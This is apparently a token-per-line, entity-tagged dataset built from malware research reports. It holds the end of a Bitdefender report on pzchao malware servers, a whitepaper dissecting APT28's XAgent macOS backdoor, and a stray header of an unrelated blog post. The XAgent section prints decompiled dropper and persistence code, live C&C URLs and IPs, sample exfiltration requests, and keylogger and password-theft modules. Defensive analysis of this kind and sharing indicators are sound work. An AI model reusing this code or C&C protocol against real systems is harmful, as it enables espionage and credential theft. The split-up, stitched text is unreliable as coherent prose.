control
of
the
system
,
spy
on
the
victims
and
exfiltrate
confidential
information
easily
.

The
malware
hosting
infrastructure
3.1
.
The
HTTP
File
Server

While
analyzing
the
download
URL
down.pzchao.com B_url.cncsvr
,
we
realized
that
it
runs
on
a
HTTP
file
server
and
we
managed
to
obtain
a
list
of
all
files
hosted
on
it
,
including
meta-information
such
as
last
modification
timestamps
and
number
of
downloads
.

A
partial
list
of
files
and
the
number
of
hits
can
be
seen
in
the
image
below
:

Another
interesting
aspect
is
that
attackers
often
reset
the
download
counters
along
with
the
IP
Logs
that
keep
a
record
of
the
targeted
victims
of
different
campaigns
.

As
shown
in
the
hit
log
above
,
the
most-downloaded
malicious
modules
are
the
SFX
installer
and
the
Gh0st B_malware.backdoor
RAT I
backdoor I
.

The
statistics
also
show
that
the
number
of
hits
(
and
implicitly
,
the
number
of
victims
)
is
constantly
increasing
,
as
per
the
graphic
below
:
3.1.1
.
Backdoors

The
malware
server
also
hosts
five
payloads
that
act
as
backdoors
on
the
targeted
systems
.

All
five
payloads
are
versions
of
the
Gh0st B_malware.backdoor
RAT I
tool I
.

Two
of
these
(
8060.exe B_malware.unknown
and
8555-.exe B_malware.unknown
)
communicate
with
the
same
main
C&C
server
rat.pzchao.com B_url.cncsvr
.

What
differs
is
that
the
packets
exchanged
between
the
client
and
the
server
begin
with
a
plaintext
header
'
Spidern
'
,
followed
by
the
data
packet
that
is
compressed
using
zlib
.

The
other
two
samples
(
9527.exe B_malware.unknown
and
8555++.exe B_malware.unknown
)
communicate
with
other
two
servers
that
are
part
of
the
infrastructure
dll.pzchao.com B_url.unknown
;
455.pzchao.com B_url.unknown
.

These
versions
will
download
the
RAT B_malware.backdoor
server
from
dll.pzchao.com B_url.unknown
.

3.1.2
.
YPrat

The
download
server
also
contains
a
Remote
Access
Trojan
developed
in
Python
(
both
client
and
server
)
.

This
server
is
used
to
listen
for
connections
on
the
same
IP
but
on
a
different
port
(
444
)
.

Our
analysis
revealed
that
it
has
extra
features
,
such
as
downloading
and
uploading
files
on
remote
infected
systems
,
as
well
as
information
harvesting
.

Judging
by
the
small
number
of
downloads
,
we
presume
that
this
payload
is
currently
undergoing
testing
.

3.1.3

Port
Scanning
Tools

Another
category
of
tools
hosted
on
the
same
server
is
port
scanning
applications
,
complemented
by
a
set
of
IP
logs
passed
as
an
argument
to
the
scanning
tools
.

These
logs
feature
a
range
of
subnets
,
mainly
located
in
Asia
.

They
are
contained
within
the
IP
logs
,
which
means
that
,
prior
to
an
infection
,
the
attackers
first
search
for
vulnerabilities
to
exploit
on
the
targeted
systems
.

Conclusions

Even
though
the
tools
used
in
this
particular
attack
are
a
few
years
old
,
they
are
battle-tested
and
more
than
suitable
for
future
attacks
.

The
ability
to
download
most
of
these
for
free
on
certain
underground
hacking
forums
decreases
the
cost
of
attack
without
compromising
on
stealth
or
effectiveness
.

Usually
,
threat
actors
are
constantly
modifying
these
tools
to
make
them
suitable
for
their
targets
they
have
in
their
crosshairs
:
governments
or
strategic
institutions
such
as
education
,
telecommunication
and
so
on
.

As
described
in
this
paper
,
this
remote
access
Torjan's B_malware.backdoor
espionage
capabilities
and
extensive
intelligence
harvesting
from
victims
turns
it
into
an
extremely
powerful
tool
that
is
very
difficult
to
identify
.

The
C&C
rotation
during
the
Trojan's B_malware.backdoor
lifecycle
also
helps
evade
detection
at
the
network
level
,
while
the
impersonation
of
legitimate
,
known
applications
takes
care
of
the
rest
.

Indicators
of
compromise
(
IoC
)
718f9ca7a38a15b0d34a29a0b8b50c88bea9d67501ca6e2ae96fbc79edecdb9d B_hash
2b98d9c0d30d09e791ad4dc981a17fa3e48fda7f1dfd68fd037946531e2cf718 B_hash
d26fb51be2d3db37fa37ba542365f616a1cecc3e4e0287e7a29a3a5a2dce7083 B_hash
d2591f4fe1c65e687c69cac007af27d24f656af5bc8eb8ff20064264fb71d56b B_hash
da4f90ad50df05899bbcb7e9359da4541f989c57602ad2705eef1d561c99cfc3 B_hash
dca2e23324f7a740d431eef0083c0b795c63fb2f4ae4bc55bc236b12ea0510e2 B_hash
d26fb51be2d3db37fa37ba542365f616a1cecc3e4e0287e7a29a3a5a2dce7083 B_hash
2234a0ecb268aa8a855b23ad0c12cf39d1a18768c857ff6b8cd7af5e2f694525 B_hash
fb602ff538f71c04b2c8271514b3923d72543ed92e717c046884f3eb1317e2af B_hash
97b69d8e0cf55708309c37d332137d10242a201c0dd93d6a513e5038dc139f57 B_hash
19841507ccf88d717a09bbba06a36644f1a555d1a53a11a2dea384bfccb9749f B_hash
0ccc0fec930917707cf8573f4c5d0845197b95e300f8692757060910e50a1de6 B_hash
698db26e6f87e19dae93034fb9e1543e8675135e6da85120de20ab6ebbe9f30b B_hash
a1ea427062bc9c497ed0660845c7e395500bf3d7f2f64c2a3f1137437d8ab6c9 B_hash
d7c0d5f399cf3f6738373aa72a5624352ce9eec1d2420c2aa91f73c565b721fd B_hash
5a28683ee05c11670e17639f4eb99609ac3d665c45d50746e5898d9efdfd4a83 B_hash
ba2ffb1ff4003db3fdf3cf48b38b3ba6c447844b4399781cbb930fc9e11c23a4 B_hash
7b33a8c1184683f94598b4bb558f5050d5512b2cb66efa27d58322b97cf5569c B_hash
81141007975251abadaa4c055f79999c0e61fb95724bfa4f98a91ced00534ebb B_hash
down.pzchao.com B_url.distribute
up.pzchao.com B_url.cncsvr
dll.pzchao.com B_url.unknown
pzchao.com.445 B_url.unknown
rat.pzchao.com B_url.cncsvr
centuriosa.info B_url.unknown
zll855.no-ip.info B_url.unknown
zll855.gicp.net B_url.unknown

Author
:
Ivona
Alexandra
Chili
–
Forensics
Engineer
,
Cyber
Threat
Intelligence
Lab

Notes

Bitdefender
is
a
global
security
technology
company
that
provides
cutting
edge
end-to-end
cyber
security
solutions
and
advanced
threat
protection
to
more
than
500
million
users
in
more
than
150
countries
.

Since
2001
,
Bitdefender
has
consistently
produced
award-winning
business
and
consumer
security
technology
,
and
is
a
provider
of
choice
in
both
hybrid
infrastructure
security
and
endpoint
protection
.

Through
R&D
,
alliances
and
partnerships
,
Bitdefender
is
trusted
to
be
ahead
and
deliver
robust
security
you
can
rely
on
.

More
information
is
available
at
http://www.bitdefender.com B_url.normal
.

©
2018
Bitdefender
.
All
rights
reserved
.
All
trademarks
,
trade
names
,
and
products
referenced
herein
are
property
of
their
respective
owners
.

FOR
MORE
INFORMATION
VISIT
:
bitdefender.com/business B_url.normal
Dissecting
the
APT28 B_malware.infosteal

Mac
OS
X
Payload

Paper
Authors
:

Tiberius
Axinte
,
Technical
Lead
,
Antimalware
Lab

Bogdan
Botezatu
-
senior
e-threat
analyst

White
Paper
A
post-mortem
analysis
of

Trojan.MAC.APT28 B_malware.infosteal
-
XAgent B_malware.infosteal

For
the
past
decade
,
Windows
users
have
been
the
main
targets
of
consumer
,
for-profit
cybercrime
.

Even
now
,
malware
on
platforms
such
as
Mac
OS
X
and
Linux
is
extremely
scarce
compared
with
the
Windows
threat
landscape
.

Enter
the
upper
tiers
of
malware
creation
:
advanced
persistent
threats
.

These
extremely
complex
,
highly
customized
files
are
after
targets
,
not
platforms
.

Attacks
such
as
those
persistently
carried
out
by
APT28 B_malware.infosteal
target
multiple
individuals
in
multiple
organizations
who
run
a
wide
range
of
hardware
and
software
configurations
.

Since
the
group's
emergence
in
2007
,
Bitdefender
has
become
familiar
with
the
backdoors
used
to
compromise
Windows
and
Linux
targets
,
such
as
Coreshell
,
Jhuhugit
and
Azzy
for
the
former
OS
or
Fysbis
for
the
latter
.

This
year
we
have
been
able
to
finally
isolate
the
Mac
OS
X
counterpart
-
the
XAgent B_malware.backdoor
modular I
backdoor I
.

This
whitepaper
describes
our
journey
in
dissecting
the
backdoor
and
documenting
it
piece
by
piece
.

A
.
Context

In
mid-February
this
year
,
we
discovered
a
new
Mac
sample
that
appeared
to
be
the
Mac
version
of
the
APT28 B_malware.infosteal
XAgent I
component
.

This
backdoor
component
is
known
to
have
a
modular
structure
featuring
various
espionage
functionalities
,
such
as
key-logging
,
screen
grabbing
and
file
exfiltration
.

Until
now
this
component
was
only
available
for
Windows
,
Linux
and
iOS
operating
systems
.

Though
you
might
expect
this
Mac
version
of
XAgent B_malware.backdoor
to
be
the
iOS
version
compiled
to
work
on
Mac
,
it
is
a
different
creation
,
with
a
much
more
advanced
feature
set
.

The
Mac
version
shares
multiple
similarities
with
those
designed
for
other
operating
systems
.

However
,
the
Mac
agent
brings
more
spying
capabilities
such
as
stealing
iOS
backups
from
Mac
computers
,
which
contain
messages
,
contacts
,
voicemail
,
call
history
,
notes
,
calendar
and
Safari
data
.

B
.
Attack
Flow

Last
year
on
26
of
September
,
PaloAlto
identified
a
new
Mac
OS
X
Trojan B_malware.backdoor
associated
with
the
APT28
/
Sofacy
group
that
received
the
'
Komplex B_malware.backdoor
'
name
.

The
Komplex B_malware.backdoor
Trojan I
is
a
binder
with
multiple
parts
:
a
dropper
,
a
payload
and
a
decoy
pdf
file
.

1
.
The
Komplex B_malware.backdoor
Binder I
:
Is
the
main
executable
of
'
roskosmos_2015-2025.app B_malware.backdoor
'
.

Its
main
purpose
is
to
save
a
second
payload
(
the
dropper
)
on
the
system
and
open
the
decoy
pdf
file
pictured
below
.

v7
=
objc_msgSend
(
&OBJC_CLASS___NSString
,
'
stringWithFormat
:
'
,
CFSTR
(
'
%@/roskosmos_2015-2025.pdf
'
)
,
v6
)
;

v8
=
objc_msgSend
(
&OBJC_CLASS___NSString
,
'
stringWithFormat
:
'
,
CFSTR
(
'
SetFile
-a
E
%@/
roskosmos_2015-2025.pdf
'
)
,
v6
)
;

v9
=
objc_msgSend
(
&OBJC_CLASS___NSString
,
'
stringWithFormat
:
'
,
CFSTR
(
'
rm
-rf
%@/roskosmos_2015-2025
.
app
'
)
,
v6
)
;

v10
=
objc_msgSend
(
&OBJC_CLASS___NSString
,
'
stringWithFormat
:
'
,

CFSTR
(
'
open
-a
Preview.app
%@/roskosmos_2015-2025.pdf
'
)
,
v6
)
;

v11
=
objc_msgSend
(
&OBJC_CLASS___NSData
,
'
dataWithBytes:length
:
'
,
&joiner
,
135028LL
)
;

objc_msgSend
(
v11
,
'
writeToFile:atomically
:
'
,
CFSTR
(
'
/tmp/content
'
)
,
1LL
)
;

v12
=
(
const
char
*
)
objc_msgSend
(
v9
,
'
UTF8String
'
)
;

system
(
v12
)
;

system
(
'
chmod
755
/tmp/content
'
)
;

v13
=
objc_msgSend
(
&OBJC_CLASS___NSData
,
'
dataWithBytes
:
length
:
'
,
&pdf
,
1584258LL
)
;

objc_msgSend
(
v13
,
'
writeToFile
:
atomically
:
'
,
v7
,
1LL
)
;

v14
=
(
const
char
*
)
objc_msgSend
(
v8
,
'
UTF8String
'
)
;

system
(
v14
)
;

v15
=
objc_msgSend
(
&OBJC_CLASS___NSTask
,
'
alloc
'
)
;

v16
=
objc_msgSend
(
v15
,
'
init
'
)
;

objc_msgSend
(
v16
,
'
setLaunchPath
:
'
,
CFSTR
(
'
/tmp/content
'
)
)


objc_msgSend
(
v16
,
'
launch
'
)
;

objc_msgSend
(
v16
,
'
waitUntilExit
'
)
;

v17
=
(
const
char
*
)
objc_msgSend
(
v10
,
'
UTF8String
'
)


system
(
v17
)
;

The
Komplex B_malware.backdoor
Binder I

Komplex B_malware.backdoor
:
roskosmos_2015-2025.pdf
2
.
The
Komplex B_malware.drop
Dropper I
:
Its
main
functionality
is
to
drop
a
third
Komplex B_malware.backdoor
component
:
the
final
payload
,
and
ensure
persistence
on
the
infected
system

system
(
'
mkdir
-p
/Users/Shared/.local/
&>
/dev/null
'
)
;

system
(
'
mkdir
-p
~/Library/LaunchAgents/
&>
/dev/null
'
)
;

off_10001B4F0
(
v5
,
&off_10001B4F0
,
CFSTR
(
'
/Users/Shared/.local/kextd
'
)
,
1LL
)
;

off_10001B4F0
(
v6
,
&off_10001B4F0
,
CFSTR
(
'
/Users/Shared/com.apple.updates.plist
'
)
,
1LL
)
;

off_10001B4F0
(
v7
,
&off_10001B4F0
,
CFSTR
(
'
/Users/Shared/start.sh
'
)
,
1LL
)
;

system
(
'
cp
/Users/Shared/com.apple.updates.plist
$HOME/Library/LaunchAgents/
&>/dev/null
'
)
;

remove
(
'
/Users/Shared/com.apple.updates.plist
'
)
;

system
(
'
chmod
755
/Users/Shared/.local/kextd
'
)
;

system
(
'
chmod
755
/Users/Shared/start.sh
'
)
;

3
.
The
Komplex B_malware.backdoor
Payload
:
Is
the
final
component
of
the
Komplex B_malware.backdoor
malware I
,
with
the
sole
purpose
of
downloading
and
executing
a
file
,
as
requested
by
the
C&C
servers
.

In
other
words
,
Komplex B_malware.backdoor
is
an
APT28
/
Sofacy
component
that
can
be
distributed
via
email
,
disguised
as
a
PDF
document
,
to
establish
a
foothold
in
a
system
.

Once
it
infects
the
host
,
it
can
download
and
run
the
next
APT28
/
Sofacy
component
,
which
-
to
the
best
of
our
knowledge
-
is
the
XAgent B_malware.backdoor
malware I
that
forms
the
object
of
this
paper
.

Our
assumption
is
guided
by
hard
evidence
included
in
the
binary
.

Our
forensics
endeavor
revealed
a
number
of
indicators
that
made
us
think
XAgent B_malware.backdoor
was
distributed
via
Komplex
malware
:

Komplex B_malware.backdoor
XAgent B_malware.backdoor

Project
path
/Users/kazak/Desktop/Project/komplex B_malware.backdoor
/Users/kazak/Desktop/Project/XAgentOSX B_malware.backdoor

Malware
path
on
the
infected
system
/Users/Shared/.local/kextd B_malware.backdoor
/Username/Library/Assistants/.local/random_name B_malware.backdoor

C&C
apple-iclods[.]net B_url.cncsvr
apple-iclods.org B_url.cncsvr

Possible
Attack
Flow

C
.
Initialization

The
main
module
of
the
XAgent B_malware.backdoor
component
is
called
BootXLoader B_malware.backdoor
.
Upon
starting
,
it
calls
the
runLoader
method
,
which
orchestrates
the
following
:

1
.
Checks
if
a
debugger
is
present
and
,
if
so
,
the
malware
exits
.

v29
=
1
;

v30
=
14
;

v31
=
1
;

v32
=
getpid()
;

v26
=
648LL
;

if
(
sysctl
(
&v29
,
4u
,
&v27
,
&v26
,
0LL
,
0LL
)
)

goto
LABEL_13
;

2
.
The
module
then
waits
for
internet
connectivity
by
pinging
'
8.8.8.8
'
.

v7
=
v2
;

v3
=
0
;

objc_retainAutorelease
(
CFSTR
(
'
8.8.8.8
'
)
)
;

v4
=
objc_msgSend_ptr
(
CFSTR
(
'
8.8.8.8
'
)
,
selRef_cStringUsingEncoding_
,
1LL
,
v7
)
;

v5
=
SCNetworkReachabilityCreateWithName
(
0LL
,
(
__int64
)
v4
)
;

HIDWORD
(
v7
)
=
0
;

if
(
(
unsigned
__int8
)
SCNetworkReachabilityGetFlags
(
v5
,
(
char
*
)
&
v7
+
4
)
)

{
.....

3
.
Initializes
the
module
used
for
communicating
with
the
C&C
servers
(
called
HTTPChannel
)
and
establishes
communication
between
the
malware
and
the
C&C
servers
.

http_chanel_obj
=
objc_msgSend_ptr
(
classRef_HTTPChannel
,
selRef_alloc
)
;

v12
=
v10
(
http_chanel_obj
,
(
const
char
*
)
selRef_init
)
;

v13
=
v10
(
classRef_NSThread
,
selRef_alloc
)
;

v14
=
objc_msgSend_ptr
(
v13
,
selRef_initWithTarget_selector_object_
,
v4
,
selRef_postThread_
,
v12
)
;

objc_msgSend_ptr
(
v14
,
selRef_start
)
;

v15
=
objc_msgSend_ptr
(
classRef_NSThread
,
selRef_alloc
)
;

v16
=
objc_msgSend_ptr
(
v15
,
selRef_initWithTarget_selector_object_
,
v4
,
selRef_getThread_
,
v12
)
;

objc_msgSend_ptr
(
v16
,
selRef_start
)
;

4.
Starts
the
main
handle
module
for
C&C
commands
and
the
spying
modules
:
MainHandler
v6
=
objc_msgSend_ptr
(
classRef_MainHandler
,
selRef_alloc
)
;

v7
=
objc_msgSend_ptr
(
v6
,
(
const
char
*
)
selRef_init
)
;

v8
=
objc_retain_ptr
(
v5
,
selRef_init
)
;

v9
=
v7[4]
;

v7[4]
=
v8
;

objc_release_ptr
(
v9
)
;

objc_msgSend_ptr
(
v7
,
selRef_cycleLoop
)
;

D
.
Communication

The
agent
starts
by
selecting
a
C&C
server
from
a
hardcoded
list
,
then
sends
a
hello
message
and
starts
two
main
communications
threads
:

One
for
receiving
commands
from
the
C&C
server
,
in
an
infinite
GET
loop
.

One
for
sending
data
to
the
C&C
server
,
in
an
infinite
POST
loop
.

1
.
Receiving
commands
from
C&C
server

The
agent
awaits
C&C
commands
from
the
server
and
inserts
them
into
a
command
queue
that
will
be
executed
in
a
separate
thread
by
MainHandler
module
.

C&C
Servers
http://23.227.196.215 B_ip.cncsvr
http://apple-iclods.org B_url.cncsvr
http://apple-checker.org B_url.cncsvr
http://apple-uptoday.org B_url.cncsvr
http://apple-search.info B_url.cncsvr

The
command
structure
,
called
cmdPacket
,
contains
a
command
identifier
,
a
command
parameter
and
a
size
for
the
parameter
.

struct
cmdPacket
{
unsigned
char
cmd
;

char
*
param
;

unsigned
long
long
param_size
;

Command
Structure

The
command
request
to
the
C&C
server
is
made
via
HTTP
GET
.

It
receives
a
base64
encoded
cmdPacket
that
has
previously
been
encrypted
with
RC4
using
a
hardcoded
KERNEL_CRYPTO_MAIN_KEY
.

HTTP
GET
Request

Method
GET

Server
C&C

Verbs

search/
?
,
find/
?
,
results/
?
,
open/
?
,
search/
?
,
close/
?

Args
from=
,
itwm=
,
ags=
,
oe=
,
aq=
,
btnG=
,
oprnd=
,
itwm=
,
utm=
,
channel=

Response
(
base64
)

Request
a
command
from
server

GET
http://apple-iclods.org/close/?itwm=LO6iN- B_url.cncsvr

PjpD0U8AVlLo_Hk3X9FSgAF&xzxI4=9_qwCS03APJT
HTTP
/
1.1

Host
:
apple-iclods.org B_url.cncsvr

Pragma
:
no-cache

Connection
:
keep-alive

Accept
:
*/*

User-Agent
:
4fe4b9560e99e33dabca553e2eeee510 B_hash

CFNetwork
/
673.3
Darwin
/
13.4.0
(
x86_64
)

Accept-Language
:
en-us

Accept-Encoding
:
gzip
,
deflate

Connection
:
keep-alive

Example
of
GET
message

Based
on
the
command
from
the
C&C
server
,
the
agent
decodes
and
decrypts
the
command
structure
,
and
inserts
it
in
a
command
queue
to
be
executed
by
the
MainHandler
module
.

Command
Value

Command

101

102

103

104

105

106

107

108

109

110

111

112

113

114

115

116

117

118

119

char

e

f

g

h

i

j

k

l

m

n

o

p

t

u

v

w

Module

InfoOS

InfoOS

RemoteShell

RemoteShell

RemoteShell

FileSystem

FileSystem

FileSystem

FileSystem

ScreenShot

ScreenShot

ScreenShot

Password

FileSystem

Action

getOsInfo

getProcessList

executeShellCommand

getInstalledApps

checkBackupIosDeviceFolder

downloadFileFromPath

createFileInSystem

executeFile

deleteFile

takeScreenShot

Start
screenShotLoop

Stop
screenShotLoop

getFirefoxPassword

uploadFile:urlServer:userName:password:

stopOperation

readFiles

C&C
Commands
and
Actions

2
.
Sending
information
to
C&C
server

To
exfiltrate
information
to
the
C&C
server
(
such
as
screenshots
,
passwords
,
files
and
more
)
,
the
agent
uses
a
defined
structure
called
msgPacket
.

struct
msgPacket
{

int
agent_id
;

short
module_id
;

unsigned
char
cmd_id
;

char
*data_
;

unsigned
int
data_size
;

unsigned
char
priority
;

Message
Structure

The
message
is
encrypted
with
RC4
with
a
hardcoded
KERNEL_CRYPTO_MAIN_KEY
.

It
then
appends
a
key
and
a
DATA_TOKEN
xor-ed
with
the
key
.

Ultimately
,
the
module
encodes
the
result
with
base64
and
sends
it
to
the
C&C
server
in
a
POST
request
.

HTTP
POST
Request

Method
POST

Server
C&C

Body
(
base64
)

Send
message
to
server

When
starting
the
communication
,
the
agent
sends
a
hello
message
to
the
server
using
the
POST
request
detailed
above
.

This
request
has
the
following
HTTP
body
:

POST
Body
for
Hello
Message

agent_id
IOPlatformUUID

module_id
0x3303

cmd_id
2

data
0x3303#3333#3344#3355#3377#

data_size
0xF

priority
0x16

Hello
message
body

POST
http://23.227.196.215/watch/?itwm=7FJcXOPyN_Znh7quXfh4WAaKquNzY B_url.unknown
&oe=9cu2LRvfab&ags=Pi8KZsjwBh&oe=HXK20P&aq=h2RBWMQI&aq=yRRTH&i5H=MKNBXTB I

Host
:
23.227.196.215 B_ip.unknown

Content-Type
:
application/x-www-form-urlencoded
;
charset=utf-8

Connection
:
keep-alive

Proxy-Connection
:
keep-alive

Accept
:
*/*

User-Agent
:
4fe4b9560e99e33dabca553e2eeee510 B_hash
(
unknown
version
)
CFNetwork/673.3
Darwin/13.4.0
(
x86_64
)

Accept-Language
:
en-us

Accept-Encoding
:
gzip
,
deflate

Content-Length
:
81

0_a70HpSuFQI7FnNetyKM559SUEcCj-WBinNUfTdPQw0ZVTfyNXe26b6isibFp_cJLGqtiOZ9Em3iUA==

Example
of
Hello
Message

E
.
Modules

All
the
important
functionalities
of
the
XAgent B_malware.backdoor
lie
in
its
modules
.

These
modules
are
used
for
communication
with
the
C&C
server
,
encryption
and
encoding
and
-
most
importantly
-
for
data
exfiltration
and
espionage
.

1
.
BootXLoader
:
is
the
main
module
that
handles
the
initialization
procedures
.

2
.
MainHandler
:
handles
C&C
commands
and
controls
the
other
modules
based
on
the
commands
it
receives
from
the
C&C
.

case
'
e
'
:

getInfoOSX

case
'
f
'
:

getProcessList

case
'
g
'
:

remoteShell

case

'
h
'
:

getInstalledAPP

case
'
i
'
:

showBackupIosFolder

case
'
j
'
:

downloadFileFromPath

case
'
k
'
:

createFileInSystem

case
'
l
'
:

execFile

case
'
m
'
:

deletFileFromPath

case
'
n
'
:

takeScreenShot

case
'
o
'
:

startTakeScreenShot

case
'
p
'
:

stopTakeScreenShot

case
'
t
'
:

getFirefoxPassword

case
'
u
'
:

ftpUpload

case
'
v
'
:

ftpStop

case
'
w
'
:

readFiles

3
.
HTTPChannel
:
Used
for
continuous
communication
with
the
C&C
server
,
for
receiving
commands
and
sending
stolen
data
to
the
server
.

-[HTTPChannel
enqueue:array:]

-[HTTPChannel
dequeue:]

-[HTTPChannel
clear:]

-[HTTPChannel
getIntegerFromProcName]

-[HTTPChannel
getAgentID]

-[HTTPChannel
createRandomSymbols:]

-[HTTPChannel
createEncodeToken:size_token:]

-[HTTPChannel
createKeyToken:]

-[HTTPChannel
random:end:]

-[HTTPChannel
generateUrlQuestion:]

-[HTTPChannel
generateHttpMes:data_size:size_http_mes:]

-[HTTPChannel
createEncodeData:size_data:size_result_data:]

-[HTTPChannel
takeOutPacket:::]

-[HTTPChannel
generateUrlParametrs:]

-[HTTPChannel
isActiveNetwork]

-[HTTPChannel
isActiveChannel]

-[HTTPChannel
nextServer:]

-[HTTPChannel
timeoutChanger:]

-[HTTPChannel
get]

-[HTTPChannel
getCryptoRawPacket]

-[HTTPChannel
postMessageThread]

-[HTTPChannel
post]

-[HTTPChannel
createCryptPacket]

-[HTTPChannel
createDecryptPacket:]

-[HTTPChannel
helloMessage]

4
.
CameraShot
:
not
implemented
.

5
.
Password
:
used
to
obtain
passwords
from
Firefox
browser
profiles
.

The
modules
saves
them
to
a
file
that
will
be
sent
to
the
C&C
servers
.

-[Password
writeLogMsg:]

-[Password
htmlLogMessage:]

-[Password
_initNSSLib]

-[Password
getFirefoxPassword]

6
.
FileSystem
:
used
for
file
management
,
such
as
:
find
file
,
delete
file
,
execute
file
,
create
file
.

-[FileSystem
getFileFromDirectory:sizeFile:]

-[FileSystem
createFile:bodyFile:sizeBody:]

-[FileSystem
executeFile:]

-[FileSystem
deleteFile:]

-[FileSystem
findFilesAtPath:withMask:andRecursion:]

7
.
FTPManager
:
used
to
upload
file
to
the
server
using
credentials
received
in
a
previous
command
from
the
C&C
server
.

-[FTPManager
buffer]

-[FTPManager
init]

-[FTPManager
_checkFMServer:]

-[FTPManager
fileSizeOf:]

-[FTPManager
_createListingArrayFromDirectoryListingData:]

-[FTPManager
_uploadData:withFileName:toServer:]

-[FTPManager
getAgentID]

-[FTPManager
_uploadFile:toServer:]

-[FTPManager
_createNewFolder:atServer:]

-[FTPManager
_contentsOfServer:]

-[FTPManager
_downloadFile:toDirectory:fromServer:]

-[FTPManager
uploadData:withFileName:toServer:]

8
.
InjectApp
:
Leverages
existing
higher-level
vel
interprocess
communication
mechanisms
by
sending
an
kASAppleScriptSuite/
kGetAEUTused
event
to
a
process
to
make
it
load
Apple
scripting
additions
.

It
then
sends
another
event
to
inject
in
to
the
following
Mac
system
processes
:

mdworker

SystemUIServer

Dock

loginwindow

UserEventAgent

-[InjectApp
injectRunningApp]

-[InjectApp
isInjectable:]

-[InjectApp
sendEventToPid:]

9
.
InfoOS
:
Gather
information
from
the
infected
computer
,
such
as
:
IOPlatformUUID
,
process
list
,
operating
system
version
.

10
.
Keylogger
:
Records
any
keystroke
from
user
activity
on
the
system
.

-[Keylogger
activeAppDidChange:]

-[Keylogger
addNotificationForActiveApp]

-[Keylogger
checkAccesibility]

-[Keylogger
checkSpecialKey:]

-[Keylogger
disableLogging]

-[Keylogger
enableLogging]

-[Keylogger
initEventTapAndStartRunLoop]

-[Keylogger
keyPressedeventMonitor]

-[Keylogger
pressedKeyWithKeyCode:andModifiers:]

-[Keylogger
removeNotificationForActiveApp]

-[Keylogger
sendLog]

-[Keylogger
setAccessibilityApplication]

-[Keylogger
setKeyPressedeventMonitor:]

-[Keylogger
start]

-[Keylogger
status]

-[Keylogger
stop]

11
.
Launcher
:
This
module
is
used
for
generating
XAgent's
file
path
on
the
infected
system
and
to
re-execute
itself.

The
malware
is
located
in
the
'
<UserHomedir>/Library/Assistants/.local/
'
path
in
a
random
directory
with
a
name
picked
from
a
hardcoded
list
.

Its
filename
is
also
picked
from
a
hardcoded
list
.

+[Launcher
randomInteger:max:]

+[Launcher
generateRandomPathAndName]

-[Launcher
reloadItSelf:]

-[Launcher
checkProcessName]

The
malware
is
located
in
the
'
<UserHomedir>/Library/Assistants/.local/
'
path
in
a
random
directory
with
a
name
picked
from
a
hardcoded
list
.

Its
filename
is
also
picked
from
a
hardcoded
list
.

Posible
Directory
Path
<UserHomedir>/Library/Assistants/.local/.localized/<exe_name>
<UserHomedir>/Library/Assistants/.local/.com.apple.kshd/<exe_name>
<UserHomedir>/Library/Assistants/.local/.com.apple.erx/<exe_name>
<UserHomedir>/Library/Assistants/.local/.com.apple.fsg/<exe_name>
<UserHomedir>/Library/Assistants/.local/.com.apple.ulk/<exe_name>
<UserHomedir>/Library/Assistants/.local/.com.apple.wsat/<exe_name>
<UserHomedir>/Library/Assistants/.local/.com.apple.sksh/<exe_name>
<UserHomedir>/Library/Assistants/.local/.com.apple.ulkg/<exe_name>
<UserHomedir>/Library/Assistants/.local/.com.apple.updater/<exe_name>

Possible
executable
name
<exe_name>

kshd
paxs
exprd
sync
scpo
update
skgc
wsat
launchd
lanchd
lauhd
mknod
mnod
rtsol
utyy
rtdl
Fres
mwwod
mpitil
mpiwtil
mpil
nfod
nfsrfd
ntfs
routr
route

12
.
RemoteShell
:
Used
to
execute
remote
commands
received
from
the
attacker
on
the
infected
machine
.

It
lists
installed
applications
as
well
as
iPhone
backups
.

-[RemoteShell
dispatchCommand:]

-[RemoteShell
start:]

-[RemoteShell
executeShellCommand:]

-[RemoteShell
getInstalledApps]

-[RemoteShell
checkBackupIosDeviceFolder]

13
.
Coder
:
Used
for
base64
encoding
/
decoding
.

Coder
::
b64Decode
(
char
*,uint,uint
*,char
*
)

Coder
::
base64UrlEncode
(
uchar
*,uint,uint
*
)

Coder
::
b64Encode
(
uchar
*,uint,uint
*,char
*
)

Coder
::
base64Decode
(
char
*,uint,uint
*
)

Coder
::
base64Encode
(
uchar
*,uint,uint
*
)

14
.
Cryptor
:
The
cryptographic
engine
used
to
encrypt
communication
with
the
C&C
server
.

CryptoContainer
::
cryptRc4
(
uchar
*,uint,uint
)

CryptoContainer
::
decryptData
(
uchar
*,uint,uint
*
)

HTTPChannel

MainHandler

CameraShot

FileObserver

FileSystem

FMServer

FTPManager

InjectApp

Keylogger

Launcher

Password

RemoteShell

ScreenShot

Coder

Cryptor

Linux

HTTPChannel

AgentKernel

FileSystem

Keylogger

RemoteShell

Coder

Cryptor

Modules
comparison
with
Linux

F
.
Conclusions

State-sponsored
threat
actors
go
to
great
lengths
to
reach
their
goals
.

With
clear
objectives
and
generous
research
&
development
budgets
,
APT
groups
get
the
job
done
.

It
was
just
a
matter
of
time
until
the
APT28
group
realized
they
were
missing
out
on
a
serious
cyber-weapon
to
target
Mac
OS
X
users
.

The
discovery
of
the
XAgent
module
once
again
reasserts
the
need
for
organizations
to
tackle
computer
security
in
a
unified
manner
,
regardless
of
the
operating
system
mix
they
have
deployed
.

Missing
out
on
Macs
or
mobile
phones
because
they
are
'
inherently
secure
'
gives
determined
attacks
the
opportunity
they
need
to
subvert
individual
devices
and
take
over
entire
networks
to
exfiltrate
information
for
months
,
if
not
years
.

Bitdefender
is
a
global
security
technology
company
that
delivers
solutions
in
more
than
100
countries
through
a
network
of
value-added
alliances
,
distributors
and
reseller
partners
.

Since
2001
,
Bitdefender
has
consistently
produced
award-winning
business
and
consumer
security
technology
,
and
is
a
leading
security
provider
in
virtualization
and
cloud
technologies
.

Through
R&D
,
alliances
and
partnership
teams
,
Bitdefender
has
elevated
the
highest
standards
of
security
excellence
in
both
its
number-one-ranked
technology
and
its
strategic
alliances
with
the
world's
leading
virtualization
and
cloud
technology
providers
.

More
information
is
available
at
http://www.bitdefender.com/ B_url.normal

All
Rights
Reserved
.
©
2015
Bitdefender
.
All
trademarks
,
trade
names
,
and
products
referenced
herein
are
property
of
their
respective
owners
.

FOR
MORE
INFORMATION
VISIT
:
enterprise.bitdefender.com B_url.normal
奇虎奇虎360技术博客
技术博客
分享奇虎360公司的技术
,
与安全的互联网共同成长
。
专栏推荐

Analysis
of
CVE-2018-8174 B_malware.unknown
VBScript
0day
and
APT
actor
related
to
Office
targeted
attack

2018
